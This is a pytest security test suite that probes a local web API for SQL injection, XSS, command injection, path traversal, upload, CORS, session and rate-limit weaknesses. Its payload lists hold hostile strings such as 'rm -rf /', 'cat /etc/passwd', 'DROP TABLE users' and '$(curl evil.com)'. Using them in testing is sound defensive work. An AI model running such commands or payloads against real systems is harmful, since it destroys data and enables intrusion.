"""
A++ Security Test Suite
Comprehensive security testing for production readiness
"""

import pytest
import requests
import hashlib
import secrets
import json
from datetime import datetime, timedelta
import jwt
import re
from typing import List, Dict, Any


class TestSecuritySuite:
    """A++ grade security testing"""

    BASE_URL = "http://localhost:8000"

    @pytest.fixture(autouse=True)
    def setup(self):
        """Setup test environment"""
        self.session = requests.Session()
        self.headers = {"Content-Type": "application/json"}

    def teardown_method(self):
        """Cleanup after each test"""
        self.session.close()

    # Authentication Security Tests
    @pytest.mark.security
    @pytest.mark.critical
    def test_sql_injection_in_login(self):
        """Test for SQL injection vulnerabilities in login"""
        sql_injection_payloads = [
            "' OR '1'='1",
            "admin'--",
            "' OR 1=1--",
            "'; DROP TABLE users--",
            "' UNION SELECT * FROM users--",
            "\\x27\\x20OR\\x20\\x271\\x27=\\x271",
        ]

        for payload in sql_injection_payloads:
            response = self.session.post(
                f"{self.BASE_URL}/api/auth/login",
                json={"username": payload, "password": payload},
                headers=self.headers
            )

            # Should not succeed with SQL injection
            assert response.status_code in [400, 401], \
                f"SQL injection vulnerability detected with payload: {payload}"

            # Check response doesn't leak database info
            assert "sql" not in response.text.lower()
            assert "syntax" not in response.text.lower()

    @pytest.mark.security
    @pytest.mark.critical
    def test_password_security_requirements(self):
        """Test password strength requirements"""
        weak_passwords = [
            "123456",
            "password",
            "12345678",
            "qwerty",
            "abc123",
            "password123",
            "admin",
            "letmein",
        ]

        for weak_password in weak_passwords:
            response = self.session.post(
                f"{self.BASE_URL}/api/auth/register",
                json={
                    "email": f"test{secrets.token_hex(4)}@example.com",
                    "password": weak_password,
                    "name": "Test User"
                },
                headers=self.headers
            )

            # Should reject weak passwords
            assert response.status_code == 400, \
                f"Weak password accepted: {weak_password}"
            assert "password" in response.text.lower()

    @pytest.mark.security
    def test_jwt_token_security(self):
        """Test JWT token implementation security"""
        # Login to get token
        response = self.session.post(
            f"{self.BASE_URL}/api/auth/login",
            json={"username": "test_user", "password": "Test123!@#"},
            headers=self.headers
        )

        if response.status_code == 200:
            token = response.json().get("token")

            # Decode without verification to inspect
            decoded = jwt.decode(token, options={"verify_signature": False})

            # Check for secure claims
            assert "exp" in decoded, "Token missing expiration"
            assert "iat" in decoded, "Token missing issued at"

            # Check expiration is reasonable (not too long)
            exp_time = datetime.fromtimestamp(decoded["exp"])
            iat_time = datetime.fromtimestamp(decoded["iat"])
            token_lifetime = exp_time - iat_time

            assert token_lifetime <= timedelta(hours=24), \
                "Token lifetime too long (security risk)"

            # Ensure no sensitive data in token
            assert "password" not in decoded
            assert "secret" not in str(decoded).lower()

    @pytest.mark.security
    def test_brute_force_protection(self):
        """Test brute force attack protection"""
        failed_attempts = []

        # Try 10 rapid failed login attempts
        for i in range(10):
            response = self.session.post(
                f"{self.BASE_URL}/api/auth/login",
                json={"username": "test_user", "password": f"wrong{i}"},
                headers=self.headers
            )
            failed_attempts.append(response.status_code)

        # Should start rate limiting or blocking
        rate_limited = any(code == 429 for code in failed_attempts[-5:])
        assert rate_limited, "No brute force protection detected"

    # Input Validation Security Tests
    @pytest.mark.security
    @pytest.mark.critical
    def test_xss_prevention(self):
        """Test XSS attack prevention"""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>",
            "<iframe src='javascript:alert(XSS)'>",
            "';alert(String.fromCharCode(88,83,83))//",
            "<svg/onload=alert('XSS')>",
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
        ]

        for payload in xss_payloads:
            # Test in various input fields
            response = self.session.post(
                f"{self.BASE_URL}/api/annotations",
                json={
                    "imageId": "test123",
                    "annotations": [{
                        "class": payload,
                        "bbox": [0, 0, 100, 100]
                    }]
                },
                headers={**self.headers, "Authorization": "Bearer test_token"}
            )

            # If request succeeds, check response is sanitized
            if response.status_code == 200:
                response_text = response.text
                assert "<script>" not in response_text
                assert "alert(" not in response_text
                assert "javascript:" not in response_text

    @pytest.mark.security
    def test_command_injection(self):
        """Test command injection vulnerabilities"""
        cmd_injection_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "&& rm -rf /",
            "`whoami`",
            "$(curl evil.com)",
            "; python -c 'import os; os.system(\"ls\")'",
        ]

        for payload in cmd_injection_payloads:
            response = self.session.post(
                f"{self.BASE_URL}/api/process",
                json={"filename": payload},
                headers={**self.headers, "Authorization": "Bearer test_token"}
            )

            # Should reject or sanitize command injection attempts
            assert response.status_code in [400, 403], \
                f"Command injection not prevented: {payload}"

    @pytest.mark.security
    def test_path_traversal(self):
        """Test path traversal attack prevention"""
        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..;/etc/passwd",
            "..//..//..//etc/passwd",
        ]

        for payload in path_traversal_payloads:
            response = self.session.get(
                f"{self.BASE_URL}/api/files/{payload}",
                headers={**self.headers, "Authorization": "Bearer test_token"}
            )

            # Should block path traversal
            assert response.status_code in [400, 403, 404], \
                f"Path traversal not blocked: {payload}"

            # Ensure no system files exposed
            assert "/etc/passwd" not in response.text
            assert "root:" not in response.text

    # API Security Tests
    @pytest.mark.security
    @pytest.mark.critical
    def test_api_authentication_required(self):
        """Test that all sensitive endpoints require authentication"""
        protected_endpoints = [
            "/api/detect",
            "/api/annotations",
            "/api/training/start",
            "/api/models",
            "/api/datasets",
            "/api/users/profile",
            "/api/admin/users",
        ]

        for endpoint in protected_endpoints:
            # Try without auth token
            response = self.session.get(
                f"{self.BASE_URL}{endpoint}",
                headers=self.headers
            )

            assert response.status_code == 401, \
                f"Endpoint not protected: {endpoint}"

    @pytest.mark.security
    def test_cors_configuration(self):
        """Test CORS security configuration"""
        response = self.session.options(
            f"{self.BASE_URL}/api/detect",
            headers={
                "Origin": "http://evil.com",
                "Access-Control-Request-Method": "POST"
            }
        )

        # Check CORS headers
        cors_headers = response.headers

        if "Access-Control-Allow-Origin" in cors_headers:
            # Should not allow all origins in production
            assert cors_headers["Access-Control-Allow-Origin"] != "*", \
                "CORS allows all origins (security risk)"

            # Should not allow evil.com
            assert "evil.com" not in cors_headers["Access-Control-Allow-Origin"]

    @pytest.mark.security
    def test_rate_limiting(self):
        """Test API rate limiting"""
        responses = []

        # Send 100 rapid requests
        for _ in range(100):
            response = self.session.get(
                f"{self.BASE_URL}/api/health",
                headers=self.headers
            )
            responses.append(response.status_code)

        # Should implement rate limiting
        rate_limited = 429 in responses
        assert rate_limited, "No rate limiting detected"

    # File Upload Security Tests
    @pytest.mark.security
    @pytest.mark.critical
    def test_file_upload_validation(self):
        """Test file upload security validations"""

        # Test malicious filename
        malicious_filenames = [
            "../../../etc/passwd",
            "../../config.py",
            "malware.exe",
            "shell.php",
            "virus.js",
            "%00.jpg",
        ]

        for filename in malicious_filenames:
            files = {"file": (filename, b"malicious content", "image/jpeg")}
            response = self.session.post(
                f"{self.BASE_URL}/api/upload",
                files=files,
                headers={"Authorization": "Bearer test_token"}
            )

            # Should reject or sanitize malicious filenames
            if response.status_code == 200:
                response_data = response.json()
                stored_filename = response_data.get("filename", "")

                # Check filename is sanitized
                assert ".." not in stored_filename
                assert "/" not in stored_filename
                assert "\\" not in stored_filename
                assert "%00" not in stored_filename

    @pytest.mark.security
    def test_file_size_limits(self):
        """Test file size upload limits"""
        # Create large file (100MB)
        large_file = b"A" * (100 * 1024 * 1024)

        files = {"file": ("large.jpg", large_file, "image/jpeg")}
        response = self.session.post(
            f"{self.BASE_URL}/api/upload",
            files=files,
            headers={"Authorization": "Bearer test_token"}
        )

        # Should reject files that are too large
        assert response.status_code in [413, 400], \
            "Large file upload not restricted"

    @pytest.mark.security
    def test_file_type_validation(self):
        """Test file type validation"""
        dangerous_files = [
            ("malware.exe", b"MZ", "application/x-msdownload"),
            ("shell.sh", b"#!/bin/bash", "application/x-sh"),
            ("script.js", b"alert('xss')", "application/javascript"),
            ("config.php", b"<?php", "application/x-php"),
        ]

        for filename, content, mime_type in dangerous_files:
            files = {"file": (filename, content, mime_type)}
            response = self.session.post(
                f"{self.BASE_URL}/api/upload",
                files=files,
                headers={"Authorization": "Bearer test_token"}
            )

            # Should reject dangerous file types
            assert response.status_code in [400, 415], \
                f"Dangerous file type accepted: {filename}"

    # Data Security Tests
    @pytest.mark.security
    @pytest.mark.critical
    def test_sensitive_data_exposure(self):
        """Test for sensitive data exposure"""
        endpoints_to_test = [
            "/api/users/profile",
            "/api/health",
            "/api/metrics",
            "/api/config",
        ]

        for endpoint in endpoints_to_test:
            response = self.session.get(
                f"{self.BASE_URL}{endpoint}",
                headers={**self.headers, "Authorization": "Bearer test_token"}
            )

            if response.status_code == 200:
                response_text = response.text.lower()

                # Check for sensitive data patterns
                sensitive_patterns = [
                    r"password",
                    r"secret",
                    r"api[_-]?key",
                    r"private[_-]?key",
                    r"access[_-]?token",
                    r"aws[_-]?secret",
                    r"database[_-]?password",
                ]

                for pattern in sensitive_patterns:
                    matches = re.findall(pattern, response_text)
                    if matches:
                        # Check if it's actually exposing values
                        assert not re.search(f'{pattern}["\':]\\s*["\'](\\w+)', response_text), \
                            f"Sensitive data exposed in {endpoint}: {pattern}"

    @pytest.mark.security
    def test_encryption_in_transit(self):
        """Test that sensitive data is encrypted in transit"""
        # This test assumes HTTPS is enforced in production
        # Check for security headers
        response = self.session.get(
            f"{self.BASE_URL}/api/health",
            headers=self.headers
        )

        security_headers = {
            "Strict-Transport-Security": "HSTS not configured",
            "X-Content-Type-Options": "Content type sniffing not prevented",
            "X-Frame-Options": "Clickjacking not prevented",
            "X-XSS-Protection": "XSS protection header missing",
            "Content-Security-Policy": "CSP not configured",
        }

        missing_headers = []
        for header, message in security_headers.items():
            if header not in response.headers:
                missing_headers.append(f"{header}: {message}")

        # Warn about missing security headers
        if missing_headers:
            pytest.skip(f"Security headers missing: {missing_headers}")

    # Session Security Tests
    @pytest.mark.security
    def test_session_fixation(self):
        """Test for session fixation vulnerabilities"""
        # Get initial session
        response1 = self.session.post(
            f"{self.BASE_URL}/api/auth/login",
            json={"username": "test_user", "password": "Test123!@#"},
            headers=self.headers
        )

        if response1.status_code == 200:
            token1 = response1.json().get("token")

            # Login again
            response2 = self.session.post(
                f"{self.BASE_URL}/api/auth/login",
                json={"username": "test_user", "password": "Test123!@#"},
                headers=self.headers
            )

            if response2.status_code == 200:
                token2 = response2.json().get("token")

                # Tokens should be different (new session)
                assert token1 != token2, "Session fixation vulnerability detected"

    @pytest.mark.security
    def test_session_timeout(self):
        """Test session timeout implementation"""
        # This is a conceptual test - actual implementation depends on token expiry
        response = self.session.post(
            f"{self.BASE_URL}/api/auth/login",
            json={"username": "test_user", "password": "Test123!@#"},
            headers=self.headers
        )

        if response.status_code == 200:
            token = response.json().get("token")

            # Decode to check expiration
            decoded = jwt.decode(token, options={"verify_signature": False})

            if "exp" in decoded:
                exp_timestamp = decoded["exp"]
                current_timestamp = datetime.now().timestamp()
                timeout_seconds = exp_timestamp - current_timestamp

                # Session should timeout within reasonable time
                assert timeout_seconds <= 86400, "Session timeout too long (> 24 hours)"

    # Error Handling Security Tests
    @pytest.mark.security
    def test_error_message_leakage(self):
        """Test that error messages don't leak sensitive information"""
        # Trigger various errors
        error_triggers = [
            ("/api/nonexistent", "GET"),
            ("/api/users/99999999", "GET"),
            ("/api/detect", "POST"),  # Without file
        ]

        for endpoint, method in error_triggers:
            if method == "GET":
                response = self.session.get(
                    f"{self.BASE_URL}{endpoint}",
                    headers={**self.headers, "Authorization": "Bearer test_token"}
                )
            else:
                response = self.session.post(
                    f"{self.BASE_URL}{endpoint}",
                    json={},
                    headers={**self.headers, "Authorization": "Bearer test_token"}
                )

            if response.status_code >= 400:
                error_text = response.text.lower()

                # Check for information leakage
                assert "stacktrace" not in error_text
                assert "traceback" not in error_text
                assert "line " not in error_text
                assert "file " not in error_text
                assert "/usr/" not in error_text
                assert "/home/" not in error_text
                assert "c:\\" not in error_text

    # OWASP Top 10 Coverage
    @pytest.mark.security
    @pytest.mark.critical
    def test_owasp_top10_coverage(self):
        """Meta-test to ensure OWASP Top 10 coverage"""
        owasp_coverage = {
            "A01_Broken_Access_Control": ["test_api_authentication_required", "test_path_traversal"],
            "A02_Cryptographic_Failures": ["test_encryption_in_transit", "test_jwt_token_security"],
            "A03_Injection": ["test_sql_injection_in_login", "test_command_injection"],
            "A04_Insecure_Design": ["test_password_security_requirements", "test_session_timeout"],
            "A05_Security_Misconfiguration": ["test_cors_configuration", "test_error_message_leakage"],
            "A06_Vulnerable_Components": [],  # Covered by dependency scanning
            "A07_Authentication_Failures": ["test_brute_force_protection", "test_session_fixation"],
            "A08_Data_Integrity_Failures": ["test_file_upload_validation", "test_file_type_validation"],
            "A09_Security_Logging_Failures": [],  # Would need specific logging tests
            "A10_SSRF": []  # Would need specific SSRF tests
        }

        # Verify we have coverage for most OWASP categories
        covered_categories = sum(1 for tests in owasp_coverage.values() if tests)
        assert covered_categories >= 7, f"Insufficient OWASP Top 10 coverage: {covered_categories}/10"


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])